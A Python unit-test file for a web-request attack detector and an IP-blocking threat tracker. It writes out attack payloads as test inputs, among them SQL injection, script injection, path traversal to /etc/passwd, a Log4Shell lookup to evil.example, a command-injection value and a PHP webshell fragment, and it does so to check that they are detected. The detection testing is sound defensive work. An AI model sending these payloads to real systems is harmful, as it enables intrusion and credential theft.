"""Unit tests for the signature engine and threat tracker.

Pure logic only — no database, no network — so they run anywhere pytest does.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest  # noqa: E402

from detection import Category, analyze  # noqa: E402
from threat import ThreatTracker  # noqa: E402


def test_benign_request_scores_zero():
    d = analyze(method="GET", path="/", query="", body="", user_agent="Mozilla/5.0")
    assert d.score == 0
    assert not d.is_malicious
    assert d.severity == "none"


@pytest.mark.parametrize(
    "query,category",
    [
        ("id=1' OR 1=1--", Category.SQLI),
        ("q=<script>alert(1)</script>", Category.XSS),
        ("file=../../../../etc/passwd", Category.TRAVERSAL),
        ("x=${jndi:ldap://evil.example/a}", Category.LOG4SHELL),
        ("cmd=;cat /etc/passwd", Category.RCE),
        ("data=base64_decode($_POST[0])", Category.WEBSHELL),
    ],
)
def test_signatures_match(query, category):
    d = analyze(method="GET", path="/search", query=query)
    assert category in d.categories
    assert d.is_malicious


def test_url_encoded_payload_is_still_caught():
    # %27%20OR%201=1 decodes to ' OR 1=1 — must not slip past the matcher.
    d = analyze(method="GET", path="/search", query="id=1%27%20OR%201=1--")
    assert Category.SQLI in d.categories


def test_double_encoded_traversal_is_caught():
    d = analyze(method="GET", path="/%252e%252e%252fetc%252fpasswd")
    assert Category.TRAVERSAL in d.categories


def test_sensitive_path_flags_credential_access():
    d = analyze(method="GET", path="/.env")
    assert Category.CREDENTIAL in d.categories


def test_scanner_user_agent_detected():
    d = analyze(method="GET", path="/", user_agent="sqlmap/1.7")
    assert Category.SCANNER in d.categories


def test_score_is_capped_at_100():
    d = analyze(
        method="POST",
        path="/.env",
        query="id=1' UNION SELECT * FROM users--",
        body="${jndi:ldap://x/a};cat /etc/passwd system(base64_decode($x))",
        user_agent="nikto",
    )
    assert d.score == 100
    assert d.severity == "critical"


def test_severity_bands():
    assert analyze(path="/", user_agent="curl/8.0").severity == "low"  # scanner=20
    assert analyze(query="id=1' OR 1=1--").severity == "medium"        # sqli=40


def test_tracker_quarantines_past_threshold():
    t = ThreatTracker(block_threshold=100, window_seconds=300, block_ttl_seconds=600)
    assert not t.record("1.2.3.4", 40).blocked
    assert not t.record("1.2.3.4", 40).blocked
    state = t.record("1.2.3.4", 40)  # cumulative 120 >= 100
    assert state.blocked
    assert state.newly_blocked
    assert t.is_blocked("1.2.3.4")


def test_tracker_isolates_sources():
    t = ThreatTracker(block_threshold=50)
    t.record("10.0.0.1", 60)
    assert t.is_blocked("10.0.0.1")
    assert not t.is_blocked("10.0.0.2")


def test_tracker_snapshot_shape():
    t = ThreatTracker(block_threshold=50)
    t.record("10.0.0.1", 60)
    snap = t.snapshot()
    assert snap["blocked_now"] == 1
    assert snap["blocks_total"] == 1
    assert snap["top_sources"][0]["ip"] == "10.0.0.1"
